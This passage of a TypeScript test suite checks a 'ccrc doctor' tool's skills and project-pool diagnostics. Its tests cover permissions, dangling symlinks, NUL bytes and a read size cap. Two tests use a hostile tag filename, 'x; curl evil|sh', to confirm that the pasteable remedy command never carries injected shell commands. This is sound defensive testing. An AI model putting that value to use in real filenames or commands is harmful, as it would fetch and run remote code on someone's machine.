    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP skills: none of the roster's config directories exist/m);
  });

  it('names EVERY skill the shipped tree lacks in one FAIL, not the first it meets (R19)', () => {
    const home = healthy('ccrc-doctor-skills-notree-two-');
    rmSync(join(home, 'ccrc', 'ccd', 'reviewer-skill'));
    rmSync(join(home, 'ccrc', 'ccd', 'worker-skill'));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL skills: the shipped tree has no .*worker-skill.*, .*reviewer-skill/m);
    expect((r.stdout.match(/^FAIL skills:/mg) ?? []).length).toBe(1);
  });

  it('a roster whose every row is unusable SKIPs in its own words — not as "no config directory exists" (R19)', () => {
    // Two conditions used to wear one SKIP sentence: no rostered home exists
    // on this box, and no roster row survived the reader (a malformed id or
    // configDirSuffix). The second is the wrappers check's finding; this one
    // now hands off by name instead of blaming directories that were never
    // looked for.
    const home = healthy('ccrc-doctor-skills-norows-');
    writeRoster(home, [{ id: 'Bad Id!', configDirSuffix: '.claude', exec: { kind: 'upstream' } } as unknown as RosterEntry]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP skills: no usable account in \$HOME\/\.ccrc\/accounts\.json — the 'wrappers' check above owns that$/m);
    expect(r.stdout).not.toMatch(/^SKIP skills: none of the roster's config directories exist/m);
  });

  it('doctor --fix CURES a stale home from the shipped tree and re-measures it: FIX line, then PASS, exit 0 (R19)', () => {
    const home = healthy('ccrc-doctor-skills-fix-');
    const f = join(installed(home, '.claude', 'ccrc-reviewer'), 'SKILL.md');
    const shipped = readFileSync(join(home, 'ccrc', 'ccd', 'reviewer-skill', 'SKILL.md'), 'utf8');
    writeFileSync(f, shipped.replace('$HOME/.cc-clips/', '$WT/.ccrc-review/'));
    rmSync(installed(home, '.claude', 'ccrc-worker'), { recursive: true });
    // H-133: the fourth installer is cured too, so a `history` arm dropped from `_fix_skills` is a red here.
    rmSync(installed(home, '.claude', 'ccrc-history'), { recursive: true });
    // Without --fix: the verdict stands and nothing is written.
    let r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).not.toMatch(/^FIX /m);
    expect(readFileSync(f, 'utf8')).not.toBe(shipped);
    // With --fix: the fixer runs the shipped tree's own installers into the
    // rostered homes, says so, and the check is measured AGAIN — the PASS is a
    // re-measurement, never a promise. The installers are bash scripts that
    // call these coreutils; the contained PATH carries none of them by design,
    // and a box's PATH carries all of them.
    for (const t of ['rm', 'mkdir', 'mv', 'cp', 'date', 'basename']) linkReal(home, t);
    r = runDoctor(home, ['doctor', '--fix']);
    expect(r.stdout).toMatch(/^FAIL skills: 3 skill\(s\) in the rostered homes/m);
    const skillsLines = r.stdout.split('\n').filter((l) => /^(FAIL|FIX|PASS|SKIP) skills|^  remedy/.test(l)).join('\n');
    expect(skillsLines).toMatch(/^FIX skills: re-ran the shipped tree's installers into 1 home\(s\)/m);
    expect(r.stdout).toMatch(/^PASS skills: 1\/1 homes carry the shipped/m);
    expect(r.code, r.stdout).toBe(0);
    expect(readFileSync(f, 'utf8')).toBe(shipped);
    expect(existsSync(join(installed(home, '.claude', 'ccrc-worker'), 'SKILL.md'))).toBe(true);
    expect(existsSync(join(installed(home, '.claude', 'ccrc-history'), 'SKILL.md'))).toBe(true);
    // The summary counts the RE-measured verdict: no failed line survives.
    expect(r.stdout).toMatch(/ 0 failed$/m);
  });

  it('doctor --fix on a healthy box prints no FIX line and changes nothing; an unknown flag is still a usage refusal', () => {
    const home = healthy('ccrc-doctor-fix-healthy-');
    const r = runDoctor(home, ['doctor', '--fix']);
    expect(r.code, r.stdout).toBe(0);
    expect(r.stdout).not.toMatch(/^FIX /m);
    const bad = runDoctor(home, ['doctor', '--repair']);
    expect(bad.code).toBe(2);
  });

  it('fails when the shipped tree itself lacks a skill — nothing says what "installed" should mean', () => {
    const home = healthy('ccrc-doctor-skills-notree-');
    rmSync(join(home, 'ccrc', 'ccd', 'reviewer-skill'));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL skills: the shipped tree has no .*reviewer-skill/m);
  });

  it('fails when the shipped tree lacks the history skill: the notree loop names it, not the per-home diff (H-133)', () => {
    const home = healthy('ccrc-doctor-skills-notree-history-');
    rmSync(join(home, 'ccrc', 'ccd', 'history-skill'), { recursive: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL skills: the shipped tree has no .*history-skill/m);
    expect((r.stdout.match(/^FAIL skills:/mg) ?? []).length).toBe(1);
  });
});


describe('ccrc doctor: pools', () => {
  /** `$HOME/.cc-sessions/pools/<project>`, with EXACT bytes. */
  function tag(home: string, project: string, bytes: string): string {
    const d = join(home, '.cc-sessions', 'pools');
    mkdirSync(d, { recursive: true });
    const p = join(d, project);
    writeFileSync(p, bytes);
    return p;
  }

  /** A project directory under `$HOME/projects`, which is where the check
   *  looks for one — the same spelling `_check_graphify` uses (`:2764`). */
  const project = (home: string, name: string): void => {
    mkdirSync(join(home, 'projects', name), { recursive: true });
  };

  /** The roster projection ccd obeys, so the orphan arm has a pool vocabulary
   *  to measure against. Generated, never hand-written — a fixture accounts.sh
   *  typed out here would be a copy of the roster deciding what the check
   *  believes. */
  const pooledRoster = (home: string): void => seedAccountsSh(home, POOLED_TEST_ROSTER);

  it('PASSES with no pools directory at all — nothing is tagged, nothing is constrained', () => {
    const home = healthy('ccrc-doctor-pools-none-');
    const line = lineFor(runDoctor(home).stdout, 'pools');
    expect(line).toMatch(/^PASS pools: /);
    expect(line).toContain('no project pools tagged');
  });

  it('PASSES on a tagged, coherent box — one line, no remedy', () => {
    const home = healthy('ccrc-doctor-pools-ok-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'pool-a');
    const out = runDoctor(home).stdout;
    expect(lineFor(out, 'pools')).toMatch(/^PASS pools: /);
    expect(out.split('\n').filter((l) => / pools: /.test(l))).toHaveLength(1);
  });

  it('FAILS pools-malformed with its own remedy, and names the file', () => {
    const home = healthy('ccrc-doctor-pools-malformed-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'Pool a');
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-malformed'));
    expect(i, `no pools-malformed line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i]).toContain('demo');
    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
  });

  it('WARNS pools-stale for a tag whose project and registry rows are both gone', () => {
    const home = healthy('ccrc-doctor-pools-stale-');
    pooledRoster(home);
    tag(home, 'quiet-basin', 'pool-a');   // no projects/quiet-basin, no *.project row
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-stale'));
    expect(i, `no pools-stale line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    // The remedy is the verb, and the verb's `--clear` arm is existence-free
    // precisely so this remedy always works.
    expect(lines[i + 1]).toContain('ccd project-pool --project quiet-basin --clear');
  });

  it('does NOT call a registry-only project stale', () => {
    // The `--pool` arm accepts a project that exists only as a registry row;
    // the doctor must use the same two-way test, or it reports every
    // custom-workdir project as stale.
    const home = healthy('ccrc-doctor-pools-regonly-');
    pooledRoster(home);
    mkdirSync(join(home, '.cc-sessions'), { recursive: true });
    writeFileSync(join(home, '.cc-sessions', 'claude-quiet-basin.project'), 'quiet-basin');
    tag(home, 'quiet-basin', 'pool-a');
    expect(lineFor(runDoctor(home).stdout, 'pools')).toMatch(/^PASS pools: /);
  });

  it('WARNS pools-orphan-pool when no rostered account carries the name', () => {
    const home = healthy('ccrc-doctor-pools-orphan-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'pool-c');          // no account in POOLED_TEST_ROSTER carries it
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-orphan-pool'));
    expect(i, `no pools-orphan-pool line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
  });

  it('WARNS pools-tmp-leak for a dot-leading entry, with `rm` as the remedy', () => {
    const home = healthy('ccrc-doctor-pools-leak-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'pool-a');
    tag(home, '.demo.4242.tmp', 'pool-a');
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-tmp-leak'));
    expect(i, `no pools-tmp-leak line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i + 1]).toContain('rm');
  });

  it('FAILS pools-unlistable when a regular file sits where the directory belongs', () => {
    const home = healthy('ccrc-doctor-pools-unlistable-');
    mkdirSync(join(home, '.cc-sessions'), { recursive: true });
    writeFileSync(join(home, '.cc-sessions', 'pools'), 'not a directory\n');
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unlistable'));
    expect(i, `no pools-unlistable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
  });

  it.skipIf(process.getuid?.() === 0)(
    'FAILS pools-unreadable for a mode-000 tag, and never calls it untagged', () => {
      const home = healthy('ccrc-doctor-pools-unreadable-');
      pooledRoster(home);
      project(home, 'demo');
      const p = tag(home, 'demo', 'pool-a');
      chmodSync(p, 0o000);
      try {
        const lines = runDoctor(home).stdout.split('\n');
        const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unreadable'));
        expect(i, `no pools-unreadable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
        expect(lines[i]).toContain('demo');
      } finally {
        chmodSync(p, 0o600);
      }
    });

  it('FAILS pools-unreadable for a DANGLING SYMLINK at a tag path, never PASS', () => {
    // `-e` is FALSE for a dangling symlink — the same defect `ccd/ccd` fixed
    // twice already (its reader and its writer verb), now a third file. A
    // half-finished `ln -s` after moving a tag must not read as "no tag here".
    const home = healthy('ccrc-doctor-pools-dangling-tag-');
    pooledRoster(home);
    project(home, 'demo');
    const d = join(home, '.cc-sessions', 'pools');
    mkdirSync(d, { recursive: true });
    symlinkSync('/nonexistent-target', join(d, 'demo'));
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unreadable'));
    expect(i, `no pools-unreadable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i]).toContain('demo');
    expect(lineFor(runDoctor(home).stdout, 'pools')).not.toMatch(/^PASS pools: /);
  });

  it('FAILS pools-unlistable for a DANGLING SYMLINK at pools/ itself, never PASS "no project pools tagged"', () => {
    // The inverse-of-the-truth case: `pools/ -> /nonexistent` must not read as
    // "nothing is tagged, every project is unconstrained" — `ccd` answers
    // `unreadable` for EVERY project on a box shaped like this, so the doctor
    // printing its most reassuring PASS here is the exact opposite of what a
    // half-finished `ln -s` after moving the registry has done.
    const home = healthy('ccrc-doctor-pools-dangling-dir-');
    mkdirSync(join(home, '.cc-sessions'), { recursive: true });
    symlinkSync('/nonexistent-target', join(home, '.cc-sessions', 'pools'));
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unlistable'));
    expect(i, `no pools-unlistable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lineFor(runDoctor(home).stdout, 'pools')).not.toMatch(/^PASS pools: /);
  });

  it.skipIf(process.getuid?.() === 0)(
    'FAILS pools-unlistable when the REGISTRY cannot be searched, never PASS "no project pools tagged"', () => {
      // THE PARENT'S BLIND SPOT, not the tag's. `-e` and `-L` on
      // `~/.cc-sessions/pools` are BOTH false when `~/.cc-sessions` itself is
      // mode 000 — neither predicate can stat OR lstat through a directory it
      // may not search — so the absence branch fires and the doctor prints its
      // most reassuring PASS on a box where `ccd`'s own reader answers
      // `unreadable` for EVERY project (measured: `_project_pool_state demo`
      // -> `unreadable`) and every placement REFUSES. Pairing `-e` with `-L`
      // (D-1848) does not close this one; only a searchability test on the
      // PARENT does. Skipped as root: root searches any directory, so the
      // fixture cannot be built.
      const home = healthy('ccrc-doctor-pools-reg-unsearchable-');
      pooledRoster(home);
      project(home, 'demo');
      tag(home, 'demo', 'pool-a');
      const reg = join(home, '.cc-sessions');
      chmodSync(reg, 0o000);
      try {
        const out = runDoctor(home).stdout;
        const lines = out.split('\n');
        const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unlistable'));
        expect(i, `no pools-unlistable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
        expect(lines[i]).toContain(reg);
        expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
        expect(lineFor(out, 'pools')).not.toMatch(/^PASS pools: /);
      } finally {
        chmodSync(reg, 0o755);
      }
    });

  it('still PASSES when the registry is ABSENT — the server box owns no ~/.cc-sessions at all', () => {
    // The other side of the guard above, and the reason it does NOT simply
    // copy `_project_pool_state`'s `[[ -d "$REG" && -x "$REG" ]]`: that reader
    // answers `unreadable` for an ABSENT `$REG` too, on a branch its own
    // comment calls unreachable (`ccd` runs `mkdir -p "$REG"` at source time).
    // `ccrc doctor` has no such guarantee — it runs on the server box, which
    // owns no registry at all — and there "nothing is tagged, every project is
    // unconstrained" is measured, not assumed. `healthy()` builds exactly that
    // box: it never creates `~/.cc-sessions`.
    const home = healthy('ccrc-doctor-pools-reg-absent-');
    expect(existsSync(join(home, '.cc-sessions')), 'the fixture is not the no-registry box').toBe(false);
    const line = lineFor(runDoctor(home).stdout, 'pools');
    expect(line).toMatch(/^PASS pools: /);
    expect(line).toContain('no project pools tagged');
  });

  it('FAILS pools-malformed for a tag holding an embedded NUL byte, and leaks no warning to stderr', () => {
    // Bash DROPS a NUL wherever it lands in a variable, so `$(< "$f")` spliced
    // `pool-\0a` into the legal-looking token `pool-a` and the check PASSED
    // "every project tag … is one legal pool name" — while the command
    // substitution ALSO printed `warning: command substitution: ignored null
    // byte in input` straight to the operator's stderr. `ccd`'s reader answers
    // `malformed` for this file. The only builtin that can SEE the NUL is
    // `read -d ''`, whose exit status distinguishes "found a delimiter" from
    // "hit EOF" — which is what the check now uses, so both halves are fixed
    // by one change.
    const home = healthy('ccrc-doctor-pools-nul-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'pool-\u0000a');
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-malformed'));
    expect(i, `no pools-malformed line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i]).toContain('demo');
    expect(r.stderr).not.toContain('null byte');
    expect(r.stderr).toBe('');
  });

  it('gives each class its OWN line and its OWN remedy, never one joined verdict', () => {
    // Two classes with two different remedies on one box: `pools-malformed` is
    // "rewrite the file", `pools-stale` is "clear the tag". Joining them hands
    // one finding the other's instruction, the collapse `_check_wrappers` was
    // split for.
    const home = healthy('ccrc-doctor-pools-two-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'Pool a');
    tag(home, 'quiet-basin', 'pool-a');
    const lines = runDoctor(home).stdout.split('\n');
    const verdicts = lines.filter((l) => / pools: /.test(l));
    expect(verdicts.length, `expected two pools verdict lines:\n${lines.join('\n')}`).toBe(2);
    for (const v of verdicts) {
      expect(lines[lines.indexOf(v) + 1]).toMatch(/^ {2}remedy: \S/);
    }
  });

  // ── HOW THE `Mutation, measured` NOTES BELOW WERE TAKEN ─────────────────
  // `runDoctor` runs the SHIPPED `ccd/ccrc-doctor-checks` (`installCcrc`
  // symlinks it into the fixture box), so a mutated build cannot be reached
  // through it and the production fix cannot be un-shipped to measure the
  // red. Each note below was therefore taken the way `pool-name-parity.test.ts`
  // runs that same file: the checks file copied to a scratchpad, the ONE guard
  // under test reverted there, and the copy sourced standalone under `set -u`
  // with an empty PATH (`. <copy>; _check_pools`). The replay HOME is minimal
  // — the `pools/` tags, the `projects/` directories and the `accounts.sh`
  // this check reads, and nothing else, since `healthy()`'s other artifacts
  // belong to other checks — so what the replay measures is the VERDICT LINE,
  // the same string these assertions read, and not vitest's own red, which is
  // the one thing a scratchpad copy cannot produce.

  // ── `-r` AND `-x` ARE DIFFERENT QUESTIONS (fix round 7, fold b) ──────────
  // Until this round `_check_pools` folded them into one FAIL
  // (`[ ! -d ] || [ ! -r ] || [ ! -x ]`), so a `pools/` at mode `--x` — every
  // tag reachable, none of them listable — was reported `pools-unlistable: …
  // so no project's tag can be read — ccd reads this same path`, which is
  // false in both halves. The AUTHORITY is `_project_pool_state`
  // (`_project_pool_state`): it stats ONE known path (`$POOLS_DIR/<project>`) and
  // never enumerates, so SEARCH is all it needs and LIST is what only this
  // check needs.
  //
  // Measured against that real reader, on exactly the two fixtures the pair
  // of tests below builds (`. ccd/ccd; _project_pool_state demo`, fixture
  // HOME, one legal tag under `pools/`):
  //     pools/ at 0111 (searchable, not listable) -> `named pool-a`
  //     pools/ at 0444 (listable, not searchable) -> `unreadable`
  // The doctor now agrees with the authority in both directions, and these
  // two tests are one pin each on one of those directions.
  it.skipIf(process.getuid?.() === 0)(
    'WARNS pools-unenumerable, never FAILS, for a pools/ that is searchable but not listable', () => {
      // The direction the fold got WRONG. `ccd` places work for this box
      // perfectly; the only thing broken is this check's own eyesight, so the
      // class has to be the one whose CLAIM is "everything works, nobody can
      // audit it" — a separate word from `pools-unlistable`, not a softer
      // tone on the same one.
      //
      // Mutation, measured: `ccd/ccrc-doctor-checks` copied to the scratchpad
      // with the split reverted (the FAIL test back to `[ ! -d "$dir" ] ||
      // [ ! -r "$dir" ] || [ ! -x "$dir" ]` and the `pools-unenumerable` WARN
      // block deleted) answers this fixture `FAIL pools: pools-unlistable: …`
      // — so all three assertions below red on that copy and pass on the tree.
      //
      // Skipped as root: root searches and lists any directory, so the
      // fixture cannot be built — the same reason the mode-000 cases above
      // skip.
      const home = healthy('ccrc-doctor-pools-unenumerable-');
      pooledRoster(home);
      project(home, 'demo');
      tag(home, 'demo', 'pool-a');
      const d = join(home, '.cc-sessions', 'pools');
      chmodSync(d, 0o111);
      try {
        const out = runDoctor(home).stdout;
        const line = lineFor(out, 'pools');
        expect(line, `no pools verdict line:\n${out}`).toMatch(/^WARN pools: /);
        expect(line).toContain('pools-unenumerable');
        // The old verdict, by name: a doctor that FAILs a box `ccd` is happy
        // with is the cross-file disagreement this whole wave keeps finding,
        // pointed at itself.
        expect(out).not.toContain('pools-unlistable');
      } finally {
        chmodSync(d, 0o755);
      }
    });

  it.skipIf(process.getuid?.() === 0)(
    'still FAILS pools-unlistable for a pools/ that is listable but not searchable', () => {
      // The direction the split must NOT have cost. `-r` alone becoming a
      // WARN is only correct because `-x` is still a FAIL on its own: at 0444
      // the reader answers `unreadable` for EVERY project (measured, above),
      // so this is the verdict that agrees with it.
      //
      // Mutation, measured: this test does NOT detect the reverted fold —
      // that copy FAILs `pools-unlistable` here too, exactly as the tree does,
      // and says nothing this assertion can see. What it DOES detect is the
      // split going one step too far: a scratchpad copy whose FAIL test lost
      // its `-x` arm (`if [ ! -d "$dir" ]; then`) answers this same fixture
      // `PASS pools: every project tag … is one legal pool name, names a
      // project that exists, and names a pool this box's roster carries` —
      // the THREE-clause sentence, because this fixture calls `pooledRoster`
      // (an earlier draft of this note quoted the roster-less branch's
      // opening instead, which this fixture cannot produce; re-measured
      // through vitest's own AssertionError) — because a 0444 directory globs fine and then
      // every `[ -e "$f" ]` inside it is false — the most reassuring PASS this
      // check has, on a box where no placement decision can be made at all.
      // That copy reds both assertions below.
      const home = healthy('ccrc-doctor-pools-unsearchable-');
      pooledRoster(home);
      project(home, 'demo');
      tag(home, 'demo', 'pool-a');
      const d = join(home, '.cc-sessions', 'pools');
      chmodSync(d, 0o444);
      try {
        const out = runDoctor(home).stdout;
        const line = lineFor(out, 'pools');
        expect(line, `no pools verdict line:\n${out}`).toMatch(/^FAIL pools: /);
        expect(line).toContain('pools-unlistable');
      } finally {
        chmodSync(d, 0o755);
      }
    });

  // ── A PASS MAY NOT CLAIM A CHECK IT SKIPPED (fix round 7, fold a) ────────
  // The orphan arm measures a tag's pool against `~/.ccrc/accounts.sh`, the
  // generated roster projection — and when that file cannot be read it makes
  // NO claim (`known` stays empty). NOTHING ELSE IN THE DOCTOR REPORTS THAT
  // FILE, which an earlier draft of this comment and of the production
  // sentence both got wrong: `_check_wrappers` holds zero occurrences of
  // `accounts.sh` and reads `accounts.json`, answering PASS on a box with the
  // JSON and no projection, and `_check_graphify` sources the projection when
  // it can and silently skips when it cannot. Measured on a full `ccrc
  // doctor` run over exactly this shape: the only line naming `accounts.sh`
  // is the pools PASS itself. The single PASS sentence that stood here
  // asserted the third clause, "names a pool this box's roster carries",
  // regardless — a PASS reporting a check that never ran, which is the same
  // false-PASS shape the `$reg`-unsearchable guard above was written for.
  //
  // MEASURED, NOT ASSUMED, about the fixture: `healthy()` writes
  // `~/.ccrc/accounts.json` (`writeRoster`) and NEVER `~/.ccrc/accounts.sh` —
  // its own comment says so and the assertion below re-measures it, so this
  // test needs nothing removed or chmod-ed, only `pooledRoster` not called.
  it('PASSES without claiming the roster half when ~/.ccrc/accounts.sh is ABSENT', () => {
    // ABSENT is what this fixture measures, and the title says so. Production
    // gates on `[ -r … ]`, which collapses absent and present-but-unreadable
    // deliberately — one condition, one answer — so a mode-000 projection is
    // NOT exercised here and this test makes no claim about it.
    // Mutation, measured: a scratchpad copy whose final PASS is the single
    // pre-fix sentence answers this fixture `PASS pools: … , names a project
    // that exists, and names a pool this box's roster carries` — which reds
    // the last two of the three assertions below (the `PASS pools: ` one
    // stays green on that copy, which is the whole defect: it is still a
    // PASS, it just reports a check that never ran).
    const home = healthy('ccrc-doctor-pools-no-vocab-');
    expect(existsSync(join(home, '.ccrc', 'accounts.sh')),
      'the fixture is not the no-roster-projection box').toBe(false);
    project(home, 'demo');
    tag(home, 'demo', 'pool-a');
    const line = lineFor(runDoctor(home).stdout, 'pools');
    expect(line).toMatch(/^PASS pools: /);
    expect(line).toContain('the pool-vocabulary half is UNMEASURED');
    expect(line).not.toContain("names a pool this box's roster carries");
  });

  it('says the roster carries NO POOLS when the projection reads fine and no account is tagged', () => {
    // THE STATE THAT IS EVERY BOX ON THE FLEET TODAY, and the one the first
    // version of this fix reported as "could not be read". `known` is empty
    // in TWO conditions — the read failed, or it succeeded and nothing is
    // tagged — and only the first is UNMEASURED. `DEFAULT_TEST_ROSTER`
    // carries no `pool` on any account, so `seedAccountsSh` writes a real
    // generated projection whose `_ccrc_pool` case has no arms: readable,
    // parseable, and empty. That is the fixture, and it goes through the
    // generator rather than being hand-written, so the empty-case shape is
    // the one `ccrc install` really emits.
    //
    // Mutation, measured: a scratchpad copy whose closing PASS branches on
    // `[ -n "$known" ]` alone — the two-state shape — answers this fixture
    // with the UNMEASURED sentence, i.e. tells the operator a file it just
    // read could not be read. The third assertion below is the one that reds
    // on it; the first two stay green, which is the whole defect.
    const home = healthy('ccrc-doctor-pools-nopools-');
    seedAccountsSh(home);
    project(home, 'demo');
    tag(home, 'demo', 'pool-a');
    const line = lineFor(runDoctor(home).stdout, 'pools');
    expect(line).toMatch(/^PASS pools: /);
    expect(line).toContain('carries NO pools at all');
    expect(line, 'the projection was readable — saying otherwise is the defect this pins')
      .not.toContain('could not be read');
    expect(line).not.toContain("names a pool this box's roster carries");
  });

  it('DOES claim the roster half when ~/.ccrc/accounts.sh was read', () => {
    // The mirror, and without it the pin above is satisfied by a check that
    // never claims the third clause at all — which would be a doctor that
    // stopped reporting the orphan arm's agreement entirely.
    //
    // Mutation, measured: a scratchpad copy whose final PASS is only the
    // UNMEASURED sentence answers this fixture with it, and this test reds
    // while the one above stays green.
    const home = healthy('ccrc-doctor-pools-vocab-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'pool-a');
    const line = lineFor(runDoctor(home).stdout, 'pools');
    expect(line).toMatch(/^PASS pools: /);
    expect(line).toContain("names a pool this box's roster carries");
    expect(line).not.toContain('UNMEASURED');
  });

  // ── A FILESYSTEM-DERIVED NAME MAY NOT RIDE INSIDE A COMMAND ─────────────
  // The `pools-stale` remedy is the exact command an operator is invited to
  // paste, and its `<project>` argument is a FILENAME read off disk. A tag
  // file named `x; curl evil|sh` rendered `remedy: clear each: ccd
  // project-pool --project x; curl evil|sh --clear` — three commands, two of
  // them the filename's. Not an escalation (writing under `pools/` already
  // needs code execution as this user), and that is exactly why it is worth
  // fixing rather than arguing about: this check's whole value is that what
  // it prints can be trusted.
  //
  // THE TWO SURFACES ARE DIFFERENT AND ONLY ONE IS FILTERED. The verdict
  // MESSAGE still names the file — it is printed, never executed, and an
  // operator who cannot see the offending name cannot go delete it. The
  // REMEDY is the one an operator runs, so the charset gate lives there.
  it('keeps a hostile stale FILENAME out of the remedy while still naming it in the verdict', () => {
    // Mutation, measured: a scratchpad copy with the charset gate reverted
    // (every stale name appended to `p_stale_cmds` unfiltered, the omission
    // counter gone) answers this fixture `remedy: clear each: ccd project-pool
    // --project x; curl evil|sh --clear` — which reds the three remedy
    // assertions below (no `curl`, the omission sentence, the count). The
    // `/^ {2}remedy: \S/` shape assertion and BOTH verdict assertions stay
    // green on that copy, which is the point of asserting them: the defect
    // was never a missing line or a missing name.
    const home = healthy('ccrc-doctor-pools-stale-hostile-');
    pooledRoster(home);
    const hostile = 'x; curl evil|sh';
    tag(home, hostile, 'pool-a');   // no projects/<name>, no *.project row
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-stale'));
    expect(i, `no pools-stale line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i]).toContain(hostile);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
    expect(lines[i + 1]).not.toContain('curl');
    expect(lines[i + 1]).toContain('NOT printed as a command');
    expect(lines[i + 1]).toMatch(/\b1 name/);
  });

  it('still prints the exact clear command for an ordinary stale name on the same box', () => {
    // The companion, and it is not decoration: a gate that omitted EVERY name
    // would satisfy the test above completely while leaving the remedy with
    // no command in it at all — a WARN whose cure is "go work it out". One
    // box, two stale tags, and the remedy has to carry the legal one's exact
    // command AND the count of what it would not print.
    //
    // Mutation, measured: a scratchpad copy whose `case` omits every name
    // (`*) p_stale_omit=$((p_stale_omit + 1)); continue ;;`) answers this
    // fixture `remedy: 2 name(s) are NOT printed as a command: …` with no
    // `ccd project-pool` in it — which reds the first and third assertions
    // below (the count moves to 2 as well), while the `curl` one stays green:
    // omitting everything is safe and useless, and only the command half
    // says so.
    const home = healthy('ccrc-doctor-pools-stale-mixed-');
    pooledRoster(home);
    tag(home, 'x; curl evil|sh', 'pool-a');
    tag(home, 'quiet-basin', 'pool-a');
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-stale'));
    expect(i, `no pools-stale line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i + 1]).toContain('ccd project-pool --project quiet-basin --clear');
    expect(lines[i + 1]).not.toContain('curl');
    expect(lines[i + 1]).toMatch(/\b1 name/);
  });

  // ── THE DOCTOR'S OWN SIZE CAP (fix round 7) ──────────────────────────────
  // `read -r -d '' -n 64` is the READER's gate, inherited here for the reason
  // every per-tag arm in this loop is: a doctor that read a tag differently
  // from the file that obeys it reports on a rule nobody enforces. Twice the
  // 32-character grammar, so no legal tag can reach it; without it a
  // `pools/<p>` symlinked at a growing log is slurped whole into a variable
  // by the one tool an operator runs when the box is already sick.
  //
  // THE WHITESPACE PAIR IS WHAT DETECTS THE MUTATION, and a big junk file is
  // NOT — the same fact `ccd`'s own cap test rests on. Measured on a
  // scratchpad copy with `-n 64` removed:
  //     `pool-a` + 100 spaces (106 bytes) -> PASS      (tree: pools-malformed)
  //     `pool-a` +  50 spaces  (56 bytes) -> PASS      (tree: PASS)
  //     1 MB of junk                      -> pools-malformed, WITH AND
  //                                          WITHOUT the cap
  // The junk file answers malformed either way because its bytes are not a
  // pool name whether 64 of them or a million are read. What DOES tell the
  // two builds apart is a file that is LEGAL WHEN READ WHOLE and longer than
  // the cap — trailing whitespace being the cheapest such tail, since the
  // strip would make it legal. Re-measured in the same round, because the
  // sentence that stood here named a different criterion ("first 64 bytes
  // legal, tail not") and was false: `pool-a` + 58 spaces + `!!!` (67 bytes)
  // matches THAT description and answers `pools-malformed` on the tree and on
  // the cap-deleted copy alike, telling the builds apart not at all. Nor does
  // the over-cap row reach the strip or the grammar test: `read -r -d '' -n 64`
  // stops short of EOF, returns 0, and the `p_malformed` bucket in
  // `_check_pools` takes it immediately, before any strip or grammar test.
  it('caps its read: 106 bytes of tag is malformed, 56 bytes is legal', () => {
    // WHAT THIS PAIR IS EVIDENCE FOR, EXACTLY: a cap somewhere in [56, 105].
    // It is not evidence for 64, and it is not evidence that the number is
    // the READER's — a `-n 80` build keeps both halves green (measured), and
    // nothing in this file compares the two literals. The title used to say
    // "applies the reader's 64-byte cap" and measured neither word. The
    // cross-file half is pinned where this repo pins cross-file spellings:
    // `pool-name-parity.test.ts` holds the doctor's `-n` literal equal to
    // `ccd/ccd`'s, alongside the grammar and the directory name.
    //
    // Mutation, measured, in the OTHER direction too: a copy with the cap
    // TIGHTENED to `-n 8` answers the 56-byte fixture `FAIL pools:
    // pools-malformed` — so the second half below is a pin on the cap's
    // value being large enough, not only on its presence.
    const over = healthy('ccrc-doctor-pools-overcap-');
    pooledRoster(over);
    project(over, 'demo');
    tag(over, 'demo', `pool-a${' '.repeat(100)}`);
    const lines = runDoctor(over).stdout.split('\n');
